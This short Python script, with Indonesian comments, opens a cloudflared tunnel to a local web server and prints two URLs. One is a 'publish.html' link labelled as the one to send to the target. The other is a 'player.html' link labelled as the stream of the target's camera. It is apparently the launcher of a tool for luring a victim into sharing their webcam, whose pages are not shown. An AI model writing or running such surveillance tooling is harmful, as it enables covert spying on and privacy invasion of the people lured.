import subprocess
import time
WHITE_BG = '\033[107m'
BLACK = '\033[30m'
RESET = '\033[0m'
WHITE = '\033[97m'
RED_BG = '\033[41m'
ORANGE_BG = '\033[48;5;202m'

def run_streamlink(port):
    # Menjalankan perintah cloudflared tunnel dan mengalihkan outputnya ke file output.txt
    cloudflared_command = f"cloudflared tunnel --url http://localhost:{port} > output.txt 2>&1 &"
    subprocess.run(cloudflared_command, shell=True)

    # Memberikan jeda 6 detik
    time.sleep(6)

    # Menjalankan perintah grep pada file output.txt
    grep_command = "grep -oP 'https://[^\s\"]+' output.txt | grep -Ev 'https://developers\.cloudflare\.com/cloudflare-one/connections/connect-apps(/run-tunnel/as-a-service/)?' | grep -Ev 'https://github\.com/quic-go/quic-go/wiki/UDP-Receive-Buffer-Size' | tail -n 1"
    result = subprocess.run(grep_command, shell=True, capture_output=True, text=True)

    # Menampilkan output dari perintah grep
    print(WHITE + RED_BG + " ☍ " + BLACK + WHITE_BG + " Link Untuk Dikirim Ke Target " + RESET)
    url = result.stdout.strip() + "/publish.html"
    print(url)
    print(WHITE + RED_BG + " ☍ " + BLACK + WHITE_BG + " Link Stream Kamera Target " + RESET)
    urlplayer = result.stdout.strip() + "/player.html"
    print(urlplayer)
if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1:
        port = sys.argv[1]
        run_streamlink(port)
    else:
        print("Nomor port tidak tersedia.")
